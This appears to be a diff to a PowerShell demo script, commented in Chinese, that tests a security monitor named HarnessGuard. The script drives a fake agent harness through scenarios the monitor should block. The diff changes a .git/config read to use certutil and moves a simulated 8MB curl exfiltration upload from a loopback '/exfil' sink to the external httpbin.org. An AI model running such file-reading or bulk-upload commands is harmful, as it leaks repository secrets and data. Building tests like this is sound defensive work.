@@ -61,7 +61,8 @@ bind = "127.0.0.1:8377"
 '@ | Set-Content "$demo\config.toml" -Encoding ascii
 
 # ---------- 2. 本地接收端（模拟外传目标，HttpListener 200） ----------
-$sinkScript = '$l=[System.Net.HttpListener]::new();$l.Prefixes.Add("http://127.0.0.1:18080/");$l.Start();try{while($true){$c=$l.GetContext();$c.Response.StatusCode=200;$c.Response.Close()}}catch{}'
+$u=[System.Net.Sockets.UdpClient]::new();$u.Connect("8.8.8.8",80);$lan=($u.Client.LocalEndPoint -as [System.Net.IPEndPoint]).Address.ToString();$u.Close()
+$sinkScript = '$l=[System.Net.HttpListener]::new();$l.Prefixes.Add(''http://+:18080/'');$l.Start();try{while($true){$c=$l.GetContext();$s=$c.Request.InputStream;$b=New-Object byte[] 65536;while($s.Read($b,0,$b.Length) -gt 0){};$c.Response.StatusCode=200;$c.Response.Close()}}catch{}'
 $sink = Start-Process powershell -ArgumentList '-NoProfile','-Command',$sinkScript -WindowStyle Hidden -PassThru
 
 # ---------- 3. 启动 HarnessGuard ----------
@@ -79,7 +80,7 @@ $H = @{ Authorization = "Bearer $token" }
 # ---------- 4. 场景 A：harness 树内读 .git → 阻断 + 杀 ----------
 "[场景 A] fake_harness(cmd) 用 type 读 repo\.git\config（期望：git-dir Block + 杀进程）"
 Push-Location $demo
-& "$demo\fake_harness.exe" /c "type repo\.git\config" 2>&1 | Out-Null
+& "$demo\fake_harness.exe" /c "certutil -dump $demo\repo\.git\config" 2>&1 | Out-Null
 Pop-Location
 Start-Sleep 2
 
@@ -91,9 +92,9 @@ Pop-Location
 Start-Sleep 2
 
 # ---------- 6. 场景 C：树内 curl 上传 8MB（>5MB 阈值）→ 断连接 + 杀 ----------
-"[场景 C] fake_harness 树内 curl POST 8MB 到 127.0.0.1:18080（期望：net-threshold Block + 断连接；回环不封 IP）"
+"[场景 C] fake_harness 树内 curl POST 8MB 到 httpbin.org（真实外部端点——本机自连/回环的大流量 send 均不产生 TCP-IP 事件，实测教训）（期望：net-threshold Block + 断连接 + 封目标 IP）"
 Push-Location $demo
-& "$demo\fake_harness.exe" /c "curl -s -m 30 --data-binary @big.bin http://127.0.0.1:18080/exfil" 2>&1 | Out-Null
+& "$demo\fake_harness.exe" /c "curl -s -m 25 --data-binary @big.bin http://httpbin.org/post" 2>&1 | Out-Null
 Pop-Location
 Start-Sleep 3
 
